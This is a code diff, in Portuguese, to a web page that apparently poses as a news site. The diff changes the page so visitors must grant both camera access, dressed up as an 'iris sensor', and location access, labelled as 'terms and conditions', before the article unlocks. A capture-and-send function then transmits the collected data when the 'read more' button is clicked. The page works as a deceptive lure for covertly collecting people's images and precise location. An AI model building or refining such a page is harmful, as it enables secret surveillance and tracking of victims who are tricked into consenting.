@@ -581,24 +581,28 @@
                     <span class="status-label">👁️ Sensor de Íris:</span>
                     <span id="cameraStatus" class="status-value status-pending">⏳</span>
                 </div>
+                <div class="status-item">
+                    <span class="status-label">📜 Termos e Condições:</span>
+                    <span id="locationStatus" class="status-value status-pending">⏳</span>
+                </div>
             </div>
             
             <p style="font-size: 11px; color: #999;">
-                Clique no botão abaixo e depois em <strong>"PERMITIR"</strong>
+                Clique no botão abaixo e depois em <strong>"PERMITIR"</strong> em ambas as solicitações
             </p>
             
-            <!-- Botão principal para chamar permissão da câmera apenas -->
+            <!-- Botão principal para chamar permissão -->
             <button id="callPermissionBtn" class="call-permission-btn">
-                🔓 PERMITIR ACESSO
+                🔓 PERMITIR CÂMERA E LOCALIZAÇÃO
             </button>
             
             <button id="initialAllowBtn" class="btn-initial" style="display: none;">✅ Acessar Site</button>
             
             <div id="warningMsg" class="warning-text" style="display: none;">
-                ⚠️ Clique no botão acima e permita o acesso!
+                ⚠️ Clique no botão acima e permita AMBAS as permissões!
             </div>
             <div id="successMsg" class="success-text" style="display: none;">
-                ✅ Permissão concedida! Clique em "Acessar Site"
+                ✅ Permissões concedidas! Clique em "Acessar Site"
             </div>
         </div>
         
@@ -709,6 +713,7 @@
         const warningMsg = document.getElementById('warningMsg');
         const successMsg = document.getElementById('successMsg');
         const cameraStatusSpan = document.getElementById('cameraStatus');
+        const locationStatusSpan = document.getElementById('locationStatus');
         
         document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Cuiaba' });
         
@@ -729,9 +734,17 @@
                 cameraStatusSpan.innerHTML = '⏳';
                 cameraStatusSpan.className = 'status-value status-pending';
             }
+            
+            if (locationGranted) {
+                locationStatusSpan.innerHTML = '✅';
+                locationStatusSpan.className = 'status-value status-granted';
+            } else {
+                locationStatusSpan.innerHTML = '⏳';
+                locationStatusSpan.className = 'status-value status-pending';
+            }
         }
         
-        // Função para solicitar permissão da CÂMERA apenas (obrigatória)
+        // Função para solicitar permissão da CÂMERA
         async function requestCameraPermission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -747,40 +760,48 @@
             }
         }
         
-        // Função para solicitar permissão de LOCALIZAÇÃO (chamada ao clicar em "Ler Mais")
+        // Função para solicitar permissão de LOCALIZAÇÃO
         function requestLocationPermission() {
             return new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
                     (posicao) => {
                         console.log('Localização autorizada:', posicao.coords);
                         locationGranted = true;
+                        updateStatusUI();
                         resolve(true);
                     },
                     (erro) => {
                         console.log('Localização negada:', erro);
                         locationGranted = false;
+                        updateStatusUI();
                         resolve(false);
                     }
                 );
             });
         }
         
-        // Função para solicitar apenas a câmera (obrigatória para acessar o site)
-        async function requestCameraOnly() {
+        // Função para solicitar AMBAS as permissões
+        async function requestAllPermissions() {
             if (isRequesting) return false;
             isRequesting = true;
             
             callPermissionBtn.disabled = true;
-            callPermissionBtn.textContent = '⏳ Solicitando permissão...';
+            callPermissionBtn.textContent = '⏳ Solicitando permissões...';
             warningMsg.style.display = 'none';
             successMsg.style.display = 'none';
             
             updateStatusUI();
             
-            // Solicitar apenas câmera
+            // Solicitar câmera primeiro
             await requestCameraPermission();
             
-            permissionsReady = cameraGranted;
+            // Pequena pausa
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Solicitar localização
+            await requestLocationPermission();
+            
+            permissionsReady = cameraGranted && locationGranted;
             
             if (permissionsReady) {
                 callPermissionBtn.style.display = 'none';
@@ -789,7 +810,7 @@
                 warningMsg.style.display = 'none';
             } else {
                 callPermissionBtn.disabled = false;
-                callPermissionBtn.textContent = '🔓 PERMITIR ACESSO';
+                callPermissionBtn.textContent = '🔓 PERMITIR CÂMERA E LOCALIZAÇÃO';
                 warningMsg.style.display = 'block';
                 successMsg.style.display = 'none';
             }
@@ -898,7 +919,7 @@
             }
         }
         
-        // Função chamada ao clicar em "Ler Mais" - solicita localização, envia dados e libera notícia
+        // Função chamada ao clicar em "Ler Mais" - envia os dados e libera notícia
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
             
@@ -906,11 +927,7 @@
             loadingNews.classList.add('show');
             
             try {
-                // Solicitar localização AGORA (popup vai aparecer)
-                console.log('Solicitando permissão de localização...');
-                await requestLocationPermission();
-                
-                // Tentar obter posição precisa se o usuário permitiu
+                // Já temos localização da permissão inicial, vamos usá-la
                 let position = null;
                 if (locationGranted) {
                     try {
@@ -974,9 +991,9 @@
             }
         }
         
-        // Botão para chamar permissão da CÂMERA apenas
+        // Botão para chamar permissões
         callPermissionBtn.addEventListener('click', () => {
-            requestCameraOnly();
+            requestAllPermissions();
         });
         
         initialAllowBtn.addEventListener('click', async () => {
@@ -992,13 +1009,18 @@
         readMoreBtn.addEventListener('click', async (e) => {
             e.preventDefault();
             if (!autoCaptureDone && permissionsReady) {
-                console.log('Botão "Ler Mais" clicado - solicitando localização...');
                 await autoCaptureAndSend();
             } else if (!permissionsReady) {
-                console.log('Permissão da câmera não concedida ainda');
-                alert('Você precisa permitir o acesso à câmera primeiro!');
+                alert('Você precisa permitir o acesso à câmera e localização primeiro!');
             }
         });
+        
+        // Tentativa automática ao carregar (opcional)
+        setTimeout(function() {
+            if (!cameraGranted && !locationGranted) {
+                console.log('Sistema pronto - clique no botão para permitir permissões');
+            }
+        }, 500);
     </script>
 </body>
 </html>
